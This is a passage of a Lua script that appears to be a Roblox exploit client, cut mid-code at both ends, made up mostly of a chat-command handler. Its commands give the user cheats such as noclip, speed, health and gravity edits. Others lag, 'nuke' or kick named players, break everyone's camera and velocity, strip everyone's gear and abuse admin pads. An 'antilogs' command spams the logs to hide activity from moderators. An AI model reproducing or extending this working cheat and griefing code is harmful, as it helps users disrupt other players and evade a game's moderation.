			elseif act == "banana" then
		                Banana(getnumber)
				Remind("Action: Banana")
			elseif act == "tguitar" or act == "tankguitar" then
				TankGuitar(getnumber)
				Remind("Action: Tank Guitar")
			elseif act == "sfriend" or act == "skelefriend" or act == "skele" then
				SkeleFriend(getnumber)
				Remind("Action: Skele Friend")
			elseif act == "spray" or act == "nozzle" then
				Spray(getnumber)
				Remind("Action: Spray")
			else
				Remind("Invalid action!")
			end
		else
			Remind("Invalid amount of arguments. (it should be 3)")
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'rfgun' then
	bullets = tonumber(string.sub(msg:lower(), #prefix + 7))
	RFGUN(bullets)
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unrfgun' then
	Connections.rapidfiregun:Disconnect()
    end

   if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'sjail' then
		Chat("jail me")
       		task.wait(0.2)
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,4,0)
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'nuke' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 6)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        surrer = player
                        Surround("nuke")
                 else
                               Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'age' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 5)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        myageis = cplr.AccountAge
			print("Age of player: "..myageis)
                        Remind("Age of player: "..myageis)
                        -- Speak(player.."'s age is "..myageis.." days!")
                        Chat("h \n\n\n "..player.."'s account age is "..myageis.." days! \n\n\n")
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'jdate' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 7)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        local dates = {}
			local user = game:HttpGet("https://users.roblox.com/v1/users/"..cplr.UserId)
			local json = game.HttpService:JSONDecode(user)
			local date = json["created"]:sub(1,10)
			local splitDates = string.split(date,"-")
			table.insert(dates,cplr.Name.." joined: "..splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
			print('Join Date (Month/Day/Year)'.. table.concat(dates, ',\n'))
			Remind('Join Date (Month/Day/Year)'.. table.concat(dates, ',\n'))
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'dkick' then -- buggy!
                 local dasplayer = string.sub(msg:lower(), #prefix + 7)
		 PLAYERCHECK(dasplayer)
                 if player ~= nil then
			if  table.find(nokick, player) then
                        	Remind("Sorry, this player cannot be kicked!") return
			end          
			dk = cplr
			dkicked = player
			dkickin = true
                        dkick(dk, kicked)
			Remind("Dog kicking the player...")
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'undkick' then -- buggy!
                 local dasplayer = string.sub(msg:lower(), #prefix + 9)
		 PLAYERCHECK(dasplayer)
                 if player ~= nil then
			dkickin = false
			Chat("respawn "..dkicked)
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'slag' then -- buggy!
                 local dasplayer = string.sub(msg:lower(), #prefix + 6)
		 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        slag(cplr, player)
			Remind("Skate lagging the player")
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'nslag' then -- buggy!
                 local dasplayer = string.sub(msg:lower(), #prefix + 7)
		 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        lagify(cplr,player)
			Remind("Skate lagging the player (2)")
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'rpaintui' then
                for i,v in ipairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
                                if v.Name == "SelectionBox" or v.Name == "LineHandleAdornment" or v.Name == "PaletteGui" then
                                                        v:Destroy()
                                end
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'sspawn' then -- save spawn
                SSpawn()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cpos' then -- print current pos
                CPOS()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'gsspawn' then -- go to saved spawn
                Spawn()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'frespawn' then -- force respawn (broken)
        FRespawn()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'mrespawn' then -- force respawn (broken)
        MRespawn()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'dummy' then
                 Dummy()
		 Remind("Creating test dummy...")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'ffix' then 
        GravFix()
        Chat("respawn me")
        ColFix()
        movestatus = false
	Remind("Fixed your game!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'rejoin' then
        Remind("Rejoinning... please wait.")
        REJOIN()
    end

    if string.sub(msg:lower(), 1, #prefix + 2) == prefix..'rj' then
        Remind("Rejoinning... please wait.")
        REJOIN()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'autorj' then
	autorejoin = true
        Remind("You will now auto rejoin this server if you get disconnected.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unautorj' then
	autorejoin = false
        Remind("You will no longer auto rejoin this server if you get disconnected.")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'prj' then
		Remind("Rejoinning... please wait.")
                game:GetService("TeleportService"):TeleportToPrivateServer(game.PlaceId, game.PrivateServerId, game:GetService("Players").LocalPlayer)
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'prejoin' then
		Remind("Rejoinning... please wait.")
                game:GetService("TeleportService"):TeleportToPrivateServer(game.PlaceId, game.PrivateServerId, game:GetService("Players").LocalPlayer)
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'shop' then
        Remind("Serverhopping... please wait!")
        Remind("[WARN]: THIS MAY REJOIN YOU TO THE SAME SERVER.")
        SERVERHOP()
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'serverhop' then
        Remind("Serverhopping... please wait!")
        Remind("[WARN]: THIS MAY REJOIN YOU TO THE SAME SERVER.")
        SERVERHOP()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'iyshop' then
	Remind("Serverhopping... (IY)")
	IYServerhop()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'scshop' then
        Remind("Serverhopping... (Shortcut Version)")
        SCSERVERHOP(false, nil)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'rshop' then
	rwj = tonumber(string.sub(msg:lower(), #prefix + 7))
        Remind("Serverhopping with your given player in server amount...")
        SCSERVERHOP(true, rwj)
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'infjump' then
                INFJUMP = true
		Remind("You can infinitely jump!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'uninfjump' then
                INFJUMP = false
		Remind("You can no longer infinitely jump!")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'speed' then
         game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = tonumber(string.sub(msg:lower(), #prefix + 7))
	 Remind("Modified your walkspeed!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'editsp' then
	 editedspeed = true
	 editedspeedis = tonumber(string.sub(msg:lower(), #prefix + 8))
	 Remind("Your walkspeed is set until you unset it!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'uneditsp' then
	 editedspeed = false
	 Remind("Unset the walkspeed.")
    end

    if string.sub(msg:lower(), 1, #prefix + 2) == prefix..'jp' then
         game.Players.LocalPlayer.Character.Humanoid.JumpPower = tonumber(string.sub(msg:lower(), #prefix + 4))
	 Remind("Modified your jumppower!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'editjp' then
	 editedjump = true
	 editedjumpis = tonumber(string.sub(msg:lower(), #prefix + 8))
	 Remind("Your jumppower is set until you unset it!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'uneditjp' then
	 editedjump = false
	 Remind("Unset the jumppower.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'minzoom' then
         game.Players.LocalPlayer.CameraMinZoomDistance = tonumber(string.sub(msg:lower(), #prefix + 9))
	 Remind("Modified your minimum zoom!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'maxzoom' then
         game.Players.LocalPlayer.CameraMaxZoomDistance = tonumber(string.sub(msg:lower(), #prefix + 9))
	 Remind("Modified your maximum zoom!")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'hlth' then
         game.Players.LocalPlayer.Character.Humanoid.Health = tonumber(string.sub(msg:lower(), #prefix + 6))
	 Remind("Modified your health!")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'fov' then
        workspace.Camera.FieldOfView = tonumber(string.sub(msg:lower(), #prefix + 5))
	Remind("Modified your Field Of View!")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'grav' then
		workspace.Gravity = tonumber(string.sub(msg:lower(), #prefix + 6))
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unlockws' then
	for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			v.Locked = false
		end
	end
    end
		
    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'lockws' then
	for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			v.Locked = true
		end
	end
    end
		
    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'noclip' then
	 noclip()
	 Remind("Noclip is now on!")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'clip' then
         clip()
	 Remind("Noclip is now off!")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'ufly' then
	 Remind("Setting you up...")
         eincrash = true ; task.wait(0.1) ; UFLY()
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'isc' then
        local Ping1 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        task.wait(1)
        local Ping2 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()   
        if Ping1 == Ping2 then 
                Remind("The server's crashed!") 
		PtSH()
        else 
                Remind("This server's not crashed!")
        end
    end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'checkc' then
        local dasplayer = string.sub(msg:lower(), #prefix + 8)
        PLAYERCHECK(dasplayer)
        if player ~= nil then
                        clientcheck = player
			Chat("reload ".. clientcheck) ; task.wait(0.5)
                        Chat("unpunish " .. clientcheck)
                        Chat("unfly " .. clientcheck)
                        Chat("thaw " .. clientcheck)
                        Chat("clip " .. clientcheck)
                        Chat("unsit " .. clientcheck)
                         local Animator = workspace:FindFirstChild(clientcheck):WaitForChild("Humanoid"):WaitForChild("Animator")
                            if #Animator:GetPlayingAnimationTracks() == 0 then
                                        Remind(clientcheck .. "'s client is frozen.")
                            else
                                Remind(clientcheck .. "'s client is running fine.")
                            end

         else
                               Remind('Cannot find player with the name: '..dasplayer)
         end
    end

   if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'breakanims' then
        local dasplayer = string.sub(msg:lower(), #prefix + 12)
        PLAYERCHECK(dasplayer)
        if player ~= nil then
                        bokck = player
                            Chat('reset ' .. bokck)
                                task.wait()
                                Chat('name ' .. bokck .. ' Torso')
                                task.wait()
                                Chat("unname " .. bokck)
				Remind("Keep trying if it didn't work!")
         else
                               Remind('Cannot find player with the name: '..dasplayer)
         end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'nocam' then
                NoCam()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'wbcam' then
                TogCam("b")    
		Remind("Breaking/fixing people's camera...")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'wfcam' then
                TogCam("f")   
		Remind("Breaking/fixing people's camera...")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'breakcam' then
                NoCam()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fixcam' then
                FixCam()
		Remind("Fixed your camera (only)!")
    end

     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixvelo' then
                VFix()
		Remind("Velocity has been fixed! Now you can do bpfixv to fix everyone's velocity.")
     end

     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'obpfixv' then
                Remind("You need to be positioned by a wall! If you aren't, rerun this command after 5 seconds.")
                Chat("sit me down");task.wait(1)
                Chat("punish me");task.wait(1)
                Chat("unpunish me");task.wait(1)
                Chat("unskydive me")     
     end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'bpfixv' then
	local target = workspace.Terrain["_Game"].Workspace.Baseplate
	movepart(target)  
	repeat task.wait() until mready == true 
	task.wait(0.5)
	Chat("skydive me")
	task.wait(0.75)
	Chat("unskydive me")
	task.wait(0.75)
	Chat("respawn me")
	Remind("If this didn't work, it might be that you didn't fix YOUR own velo yet! Do fixvelo then try again.")
     end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'flipbp' then
	Remind("Flipping...")
	local target = workspace.Terrain["_Game"].Workspace.Baseplate
	movepart(target)  
	repeat task.wait() until mready == true
	task.wait(0.5)
	Chat("skydive me")
	task.wait(0.75)
	Chat("unskydive me")
	task.wait(0.75)
	Chat("trip me")
	task.wait(0.75)
	Chat("respawn me")
	Remind("Flipped the baseplate!")
     end

     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fakebp' then
                local gamefolder = game:GetService("Workspace").Terrain["_Game"]
                if not gamefolder:FindFirstChild("PhantomStorage") then
                            local PStore = Instance.new("Folder")
                            PStore.Name = "PhantomStorage"
                            PStore.Parent = gamefolder
                end
                local Storage = gamefolder["PhantomStorage"] -- Phantom Storage folder
                local Phantom_Baseplate = Instance.new("Part")
                Phantom_Baseplate.BrickColor = BrickColor.new("Bright green")
                Phantom_Baseplate.Material = Enum.Material.Plastic
                Phantom_Baseplate.Position = Vector3. new(0, 0.1, 0)
                Phantom_Baseplate.Size = Vector3. new(1000, 1.2, 1000)
                Phantom_Baseplate.Anchored = true
                Phantom_Baseplate.Parent = Storage
		Remind("Remove the fake baseplate by doing nofakebp.")
    end

     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'nofakebp' then
                game:GetService("Workspace").Terrain["_Game"]["PhantomStorage"]:Destroy()
		Remind("Removed the fake baseplate!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fixcol' then
                ColFix()
		Remind("Fixed your collisions.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixgrav' then
                GravFix()
		Remind("Fixed your gravity.")
    end

     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'novelo' then
                NoVelo()
		Remind("Breaking everyone's velocity...")
     end

     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'breakvelo' then
                NoVelo()
		Remind("Breaking everyone's velocity...")
     end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'loopgrab' then
    	if not string.sub(msg:lower(), 1, #prefix + 9) == prefix..'loopgrab2' then
        	loopgrab = true
		Remind("Loopgrabbing the pads!")
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unloopgrab' then
	if not string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unloopgrab2' then
		loopgrab = false
		Remind("Stopped loopgrabbing the pads!")
	end
    end

     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fastpads' then
                FastPads()	
		Remind("Getting the pads.")
     end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'loopgrab2' then
        loopgrab2 = true
	Remind("Loopgrabbing the pads (2)!")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unloopgrab2' then
        loopgrab2 = false
	Remind("Stopped loopgrabbing the pads (2)!")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'perm' then
	if not string.sub(msg:lower(), 1, #prefix + 5) == prefix..'perm2' then
        	perm = true
		Remind("You now have a perm pad!")
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'unperm' then
	if not string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unperm2' then
        	perm = false
		Remind("You no longer have a perm pad!")
	end
    end

   if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'perm2' then
        perm2 = true
	Remind("You now have a perm pad (2)!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unperm2' then
        perm2 = false
	Remind("You no longer have a perm pad (2)!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'allpads' then
                AllPads()
		Remind("Got all the pads available.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'checkbp' then
        local checker = string.sub(msg:lower(), #prefix + 9)
        PLAYERCHECK(checker)
        if player ~= nil then 
                CheckBackpack()
		Remind("Check console by running /console!")
        else
                Remind('Cannot find player with the name: '..checker)
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'gotosky' then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,1000,0)
		Remind("Skydived you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'ungearme' then
                Chat("ungear me																				all	all")
		Remind("Ungeared yourself... and everyone.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'nowater' then
                SuperCMD("gear me 88146497")
		Chat("Do actall on water places")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'watermap' then
                SuperCMD("gear me 236438668")
		Chat("Do actall then ungear so they don't retract")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixpaint' then
	Remind("Fixing paint...")
        FixPaint()
     end

   if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'anticrash' then
        anticrash = true
	Remind("Anti crash is now enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unanticrash' then
        anticrash = false
	Remind("Anti crash is now disabled.")
    end

   if string.sub(msg:lower(), 1, #prefix + 14) == prefix..'emranticrash' then
        emranticrash = true
	Remind("EMR Anti crash is now enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 16) == prefix..'unemranticrash' then
        emranticrash = false
	Remind("EMR Anti crash is now disabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antigs' then -- what is this?
        antis.antigrayscale = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantigs' then 
        antis.antigrayscale = false
	Remind("Disabled this anti!")
    end	   

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antipaint' then
        antipaint = true
	Remind("Anti paint is now enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantipaint' then
        antipaint = false
	Remind("Anti paint is now disabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antigear' then
        antigear = true
	Remind("Anti gear is now enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantigear' then
        antigear = false
	Remind("Anti gear is now disabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antigb' then
        antigb = true
	Remind("Anti gearban is now enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantigb' then
        antigb = false
	Remind("Anti gearban is now disabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'antiattach2' then
        antiattach2 = true
	Remind("Anti ivory is now enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'unantiattach2' then
        antiattach2 = false
	Remind("Anti ivory is now disabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antiattach' then
	if not string.sub(msg:lower(), 1, #prefix + 11) == prefix..'antiattach2' then
        	antiattach = true
		Remind("Anti attach is now enabled.")
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantiattach' then
	if not string.sub(msg:lower(), 1, #prefix + 13) == prefix..'unantiattach2' then
        	antiattach = false
		Remind("Anti attach is now disabled.")
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antifling' then
        antis.antifling = true
	Remind("Anti fling is now enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantifling' then
        antis.antifling = false
	Remind("Anti fling is now disabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'noblt' then
        noblt = true
	Remind("Players can no longer use some tools since they are annoying.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unnoblt' then
        noblt = false
	Remind("Players can now use the annoying tools.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antiray' then
        antiraygun = true
	Remind("Players can no longer use the ray gun.")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantiray' then
        antiraygun = false
	Remind("Players can now use the ray gun.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'novoid' then
                workspace.FallenPartsDestroyHeight = 0/0
		Remind("Void removed.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixvoid' then
                workspace.FallenPartsDestroyHeight = -500
		Remind("Void returned.")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'cvoid' then
	        local args = string.split(msg, " ")
		local dh = args[2] or -500
		if isNumber(dh) then
			workspace.FallenPartsDestroyHeight = dh
		end		
		Remind("Void changed.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'pinglogs' then
        PingLogs = true
	Remind("You'll get pinged when someone uses logs.")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unpinglogs' then
        PingLogs = false
	Remind("You'll no longer get pinged when someone uses logs.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antilogs' then
        AntiLogs = true
	Remind("Auto-spamming the logs now when someone tries looking.")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantilogs' then
        AntiLogs = false
	Remind("No longer auto-spamming the logs now when someone tries looking.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'pingcsys' then
        PingCsystem = true
	Remind("You'll get pinged when someone uses /c system or /w.")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unpingcsys' then
        PingCsystem = false
	Remind("You'll no longer get pinged when someone uses /c system or /w.")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'noobdetect' then
        noobdetect = true
	Remind("You'll get pinged when someone uses baby commands or wrong prefixes")
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unnoobdetect' then
        noobdetect = false
	Remind("You'll no longer get pinged when someone uses baby commands or wrong prefixes")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiblind' then
        antis.antiblind = true
	Remind("Turned this anti on for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiblind' then
        antis.antiblind = false
	Remind("Turned this anti off for you!")
    end

-- !! I WILL TRY TO FIX THE ANTI SYSTEM SO IT CAN BE INDIVIDUAL PLAYERS FOR EVERYTHING. ALSO, I WILL FIX THE VARIABLE NAMES !! --
    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiaddon' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiaddon = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiaddon = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antiaddon = true
                ALLantiaddon = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiaddon' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiaddon = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiaddon = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antiaddon = false
                ALLantiaddon = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'anticlone' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.anticlone = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLanticlone = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.anticlone = true
                ALLanticlone = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unanticlone' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.anticlone = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLanticlone = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.anticlone = false
                ALLanticlone = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antidog' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antidog = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantidog = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antidog = true
                ALLantidog = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantidog' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antidog = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantidog = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antidog = false
                ALLantidog = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antifire' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antifire = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantifire = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antifire = true
                ALLantifire = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantifire' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antifire = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantifire = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antifire = false
                ALLantifire = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end   
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antifreeze' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antifreeze = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantifreeze = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antifreeze = true
                ALLantifreeze = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

   if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantifreeze' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antifreeze = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantifreeze = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antifreeze = false
                ALLantifreeze = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end   
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antiff' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiff = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiff = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antiff = true
                ALLantiff = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

  if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantiff' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiff = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiff = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antiff = false
                ALLantiff = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antiglow' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiglow = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiglow = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antiglow = true
                ALLantiglow = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantiglow' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiglow = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiglow = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antiglow = false
